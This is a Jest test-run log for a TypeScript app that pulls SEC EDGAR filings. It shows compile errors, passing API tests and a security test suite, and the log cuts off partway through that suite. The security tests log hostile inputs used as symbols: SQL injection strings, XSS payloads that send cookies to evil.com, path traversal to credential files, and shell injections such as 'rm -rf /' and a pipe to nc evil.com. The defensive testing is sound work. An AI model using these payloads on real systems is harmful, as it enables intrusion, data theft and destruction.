    [7m182[0m                   const holding = this.convertToInstitutionalHolding(currentHolding, managerInfo)
    [7m   [0m [91m                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[0m
    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m200[0m:[93m20[0m - [91merror[0m[90m TS2345: [0mArgument of type 'unknown' is not assignable to parameter of type 'Error | null | undefined'.·
    [7m200[0m           callback(error)
    [7m   [0m [91m                   ~~~~~[0m
    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m291[0m:[93m67[0m - [91merror[0m[90m TS1501: [0mThis regular expression flag is only available when targeting 'es2018' or later.·
    [7m291[0m     const infoTableRegex = /<infoTable[^>]*?>(.*?)<\\/infoTable>/gis
    [7m   [0m [91m                                                                  ~[0m"

      12 |       expect(() => {
      13 |         require('../InstitutionalAnalysisEngine')
    > 14 |       }).not.toThrow()
         |              ^
      15 |     })
      16 |
      17 |     test('should_have_institutional_cache_manager_available', () => {

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:14:14)

  ● Institutional Data Services Integration Tests › Module Exports and Structure › should_export_institutional_analysis_engine_class

    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m68[0m:[93m7[0m - [91merror[0m[90m TS2353: [0mObject literal may only specify known properties, and 'parseNodeValue' does not exist in type 'X2jOptions'.

      [7m68[0m       parseNodeValue: true,
      [7m  [0m [91m      ~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m169[0m:[93m22[0m - [91merror[0m[90m TS2339: [0mProperty 'processElementValue' does not exist on type 'Transform'.
      [7m169[0m                 this.processElementValue(currentElement, currentValue.trim(), currentHolding)
      [7m   [0m [91m                     ~~~~~~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m181[0m:[93m45[0m - [91merror[0m[90m TS2339: [0mProperty 'isValidHolding' does not exist on type 'Transform'.
      [7m181[0m                 if (insideInfoTable && this.isValidHolding(currentHolding)) {
      [7m   [0m [91m                                            ~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m182[0m:[93m40[0m - [91merror[0m[90m TS2339: [0mProperty 'convertToInstitutionalHolding' does not exist on type 'Transform'.
      [7m182[0m                   const holding = this.convertToInstitutionalHolding(currentHolding, managerInfo)
      [7m   [0m [91m                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m200[0m:[93m20[0m - [91merror[0m[90m TS2345: [0mArgument of type 'unknown' is not assignable to parameter of type 'Error | null | undefined'.
      [7m200[0m           callback(error)
      [7m   [0m [91m                   ~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m291[0m:[93m67[0m - [91merror[0m[90m TS1501: [0mThis regular expression flag is only available when targeting 'es2018' or later.
      [7m291[0m     const infoTableRegex = /<infoTable[^>]*?>(.*?)<\/infoTable>/gis
      [7m   [0m [91m                                                                  ~[0m

  ● Institutional Data Services Integration Tests › Service Instantiation Tests › should_instantiate_institutional_analysis_engine_without_errors

    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m68[0m:[93m7[0m - [91merror[0m[90m TS2353: [0mObject literal may only specify known properties, and 'parseNodeValue' does not exist in type 'X2jOptions'.

      [7m68[0m       parseNodeValue: true,
      [7m  [0m [91m      ~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m169[0m:[93m22[0m - [91merror[0m[90m TS2339: [0mProperty 'processElementValue' does not exist on type 'Transform'.
      [7m169[0m                 this.processElementValue(currentElement, currentValue.trim(), currentHolding)
      [7m   [0m [91m                     ~~~~~~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m181[0m:[93m45[0m - [91merror[0m[90m TS2339: [0mProperty 'isValidHolding' does not exist on type 'Transform'.
      [7m181[0m                 if (insideInfoTable && this.isValidHolding(currentHolding)) {
      [7m   [0m [91m                                            ~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m182[0m:[93m40[0m - [91merror[0m[90m TS2339: [0mProperty 'convertToInstitutionalHolding' does not exist on type 'Transform'.
      [7m182[0m                   const holding = this.convertToInstitutionalHolding(currentHolding, managerInfo)
      [7m   [0m [91m                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m200[0m:[93m20[0m - [91merror[0m[90m TS2345: [0mArgument of type 'unknown' is not assignable to parameter of type 'Error | null | undefined'.
      [7m200[0m           callback(error)
      [7m   [0m [91m                   ~~~~~[0m
      [96mapp/services/financial-data/Form13FParser.ts[0m:[93m291[0m:[93m67[0m - [91merror[0m[90m TS1501: [0mThis regular expression flag is only available when targeting 'es2018' or later.
      [7m291[0m     const infoTableRegex = /<infoTable[^>]*?>(.*?)<\/infoTable>/gis
      [7m   [0m [91m                                                                  ~[0m

  console.log
    [dotenv@17.2.2] injecting env (27) from .env -- tip: 🔐 prevent committing .env to code: https://dotenvx.com/precommit

      at _log (node_modules/dotenv/lib/main.js:139:11)

  console.log
    ✓ SEC EDGAR API is accessible and responsive

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:52:17)

  console.log
    ✓ SEC EDGAR returned placeholder stock data for AAPL

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:93:17)

  console.log
    ✓ Retrieved company info for AAPL: Apple Inc.

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:131:17)

  console.log
    ✓ SEC EDGAR returned placeholder market data for MSFT

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:187:17)

  console.log
    ⚠ No 13F holdings found for AAPL - this may be due to:

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:247:17)

  console.log
      - Symbol-to-CIK mapping limitations

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:248:17)

  console.log
      - SEC EDGAR API rate limiting

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:249:17)

  console.log
      - Data availability in test environment

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:250:17)

  console.error
    No CIK found for symbol UNKNOWN_SYMBOL_NO_13F

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:276:24)

  console.log
    ⚠ No Form 4 transactions found for TSLA - this may be due to:

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:364:17)

  console.log
      - Symbol-to-CIK mapping limitations

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:365:17)

  console.log
      - SEC EDGAR API rate limiting

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:366:17)

  console.log
      - Limited insider activity in specified timeframe

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:367:17)

  console.error
    No CIK found for symbol UNKNOWN_SYMBOL_NO_FORM4

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:393:28)

  console.log
    ⚠ Could not calculate institutional sentiment for NVDA

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:472:17)

  console.error
    No CIK found for symbol UNKNOWN_SYMBOL_NO_INSTITUTIONAL

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:480:25)

  console.log
    ⚠ Could not calculate insider sentiment for JPM

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:553:17)

  console.error
    No CIK found for symbol UNKNOWN_SYMBOL_NO_INSIDER

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:561:25)

  console.log
    ✓ Rate limiting enforced: 348ms for 3 requests

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:580:15)

  console.log
    ✓ Concurrent requests handled properly: 245ms for 3 symbols

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:601:15)

  console.log
    ✓ CIK mapping verified: AAPL -> 0000320193

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:697:19)

  console.log
    ✓ CIK mapping verified: MSFT -> 0000789019

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:697:19)

  console.log
    ✓ CIK mapping verified: GOOGL -> 0001652044

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.test.ts:697:19)


  ●  Cannot log after tests are done. Did you forget to wait for something async in your test?
    Attempted to log "✅ Redis connected successfully".

      104 |     // Event handlers
      105 |     this.redis.on('connect', () => {
    > 106 |       console.log('✅ Redis connected successfully')
          |               ^
      107 |       this.redisAvailable = true
      108 |     })
      109 |

      at console.log (node_modules/@jest/console/build/index.js:311:10)
      at EventEmitter.<anonymous> (app/services/cache/RedisCache.ts:106:15)


  ●  Cannot log after tests are done. Did you forget to wait for something async in your test?
    Attempted to log "🚀 Redis ready for operations".

      109 |
      110 |     this.redis.on('ready', () => {
    > 111 |       console.log('🚀 Redis ready for operations')
          |               ^
      112 |       this.redisAvailable = true
      113 |     })
      114 |

      at console.log (node_modules/@jest/console/build/index.js:311:10)
      at EventEmitter.<anonymous> (app/services/cache/RedisCache.ts:111:15)

PASS app/services/financial-data/__tests__/SECEdgarAPI.test.ts (28.82 s, 543 MB heap size)
  SECEdgarAPI
    API Initialization and Configuration
      ✓ should_initialize_api_with_default_timeout_successfully (59 ms)
      ✓ should_initialize_api_with_custom_timeout_successfully (100 ms)
      ✓ should_use_proper_user_agent_for_sec_compliance (70 ms)
      ✓ should_enforce_sec_rate_limiting_configuration (66 ms)
    Health Check and API Connectivity
      ✓ should_pass_health_check_with_real_sec_edgar_endpoint (158 ms)
      ✓ should_handle_sec_edgar_rate_limiting_in_health_check (226 ms)
    Stock Price Data (SEC EDGAR Limitations)
      ✓ should_handle_stock_price_request_gracefully_despite_limitations (270 ms)
      ✓ should_handle_invalid_symbol_for_stock_price_gracefully (63 ms)
    Company Information Retrieval
      ✓ should_retrieve_company_info_for_known_symbol_with_real_api (144 ms)
      ✓ should_handle_multiple_known_symbols_for_company_info (896 ms)
      ✓ should_handle_unknown_symbol_for_company_info_gracefully (63 ms)
    Market Data (SEC EDGAR Limitations)
      ✓ should_return_placeholder_market_data_due_to_sec_limitations (63 ms)
    13F Institutional Holdings Analysis
      ✓ should_retrieve_13f_holdings_for_known_symbol_with_real_api (156 ms)
      ✓ should_respect_quarters_parameter_for_13f_holdings (445 ms)
      ✓ should_handle_symbol_without_13f_data_gracefully (64 ms)
      ✓ should_sort_13f_holdings_by_filing_date_descending (428 ms)
    Form 4 Insider Transaction Analysis
      ✓ should_retrieve_form4_transactions_for_known_symbol_with_real_api (974 ms)
      ✓ should_respect_days_parameter_for_form4_transactions (3924 ms)
      ✓ should_handle_symbol_without_form4_data_gracefully (63 ms)
      ✓ should_sort_form4_transactions_by_filing_date_descending (5421 ms)
    Institutional Sentiment Analysis
      ✓ should_calculate_institutional_sentiment_from_13f_data (326 ms)
      ✓ should_handle_symbol_without_institutional_data_for_sentiment (63 ms)
    Insider Sentiment Analysis
      ✓ should_calculate_insider_sentiment_from_form4_data (8186 ms)
      ✓ should_handle_symbol_without_insider_data_for_sentiment (63 ms)
    Rate Limiting and SEC Compliance
      ✓ should_enforce_sec_edgar_rate_limiting_between_requests (423 ms)
      ✓ should_handle_concurrent_requests_with_proper_queuing (310 ms)
      ✓ should_maintain_request_delay_consistency (358 ms)
    Error Handling and Resilience
      ✓ should_handle_network_errors_gracefully (66 ms)
      ✓ should_handle_timeout_errors_gracefully (63 ms)
      ✓ should_sanitize_error_messages_for_security (66 ms)
      ✓ should_recover_gracefully_from_api_errors (324 ms)
    Data Parsing and Validation
      ✓ should_validate_cik_to_symbol_mapping_for_known_companies (63 ms)
      ✓ should_handle_symbol_case_insensitivity (205 ms)
      ✓ should_validate_accession_number_format_in_responses (155 ms)
      ✓ should_validate_date_formats_in_responses (4475 ms)

  console.log
    [dotenv@17.2.2] injecting env (27) from .env -- tip: 🛠️  run anywhere with `dotenvx run -- yourcommand`

      at _log (node_modules/dotenv/lib/main.js:139:11)

  console.error
    No CIK found for symbol '; DROP TABLE companies; --

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:38:32)

  console.error
    No CIK found for symbol '; DROP TABLE companies; --

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:39:36)

  console.error
    No CIK found for symbol ' UNION SELECT password FROM users; --

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:38:32)

  console.error
    No CIK found for symbol ' UNION SELECT password FROM users; --

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:39:36)

  console.error
    No CIK found for symbol '; DELETE FROM holdings WHERE 1=1; --

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:38:32)

  console.error
    No CIK found for symbol '; DELETE FROM holdings WHERE 1=1; --

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:39:36)

  console.error
    No CIK found for symbol '; INSERT INTO malicious_table VALUES ('hacked'); --

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:38:32)

  console.error
    No CIK found for symbol '; INSERT INTO malicious_table VALUES ('hacked'); --

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:39:36)

  console.error
    No CIK found for symbol ' OR '1'='1

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:38:32)

  console.error
    No CIK found for symbol ' OR '1'='1

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:39:36)

  console.error
    No CIK found for symbol '; EXEC xp_cmdshell('format c:'); --

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:38:32)

  console.error
    No CIK found for symbol '; EXEC xp_cmdshell('format c:'); --

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:39:36)

  console.log
    ✓ SQL injection attempts properly rejected

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:49:15)

  console.error
    No CIK found for symbol <script>alert("XSS")</script>

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol <img src=x onerror=alert(document.cookie)>

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol <iframe src="javascript:alert(1)"></iframe>

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol "><script>fetch("http://evil.com/steal?data="+document.cookie)</script>

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol <svg onload=alert("XSS")>

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol javascript:alert("XSS")

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol <body onload=alert("XSS")>

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.error
    No CIK found for symbol <meta http-equiv="refresh" content="0;url=http://evil.com">

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at SECEdgarAPI.getInstitutionalSentiment (app/services/financial-data/SECEdgarAPI.ts:241:24)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:66:33)

  console.log
    ✓ XSS attacks properly prevented

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:73:15)

  console.error
    No CIK found for symbol ../../../etc/passwd

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol ..\..\..\windows\system32\config\sam

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol ....//....//....//etc//shadow

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol /etc/hosts

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol C:\Windows\System32\drivers\etc\hosts

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol ../../sensitive/config.json

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol ../app/services/auth/secrets.txt

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol ..%2F..%2F..%2Fetc%2Fpasswd

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.error
    No CIK found for symbol %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:91:32)

  console.log
    ✓ Path traversal attempts properly rejected

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:99:15)

  console.error
    No CIK found for symbol AAPL; cat /etc/passwd

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL; cat /etc/passwd

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL && rm -rf /

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL && rm -rf /

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL | nc evil.com 1234

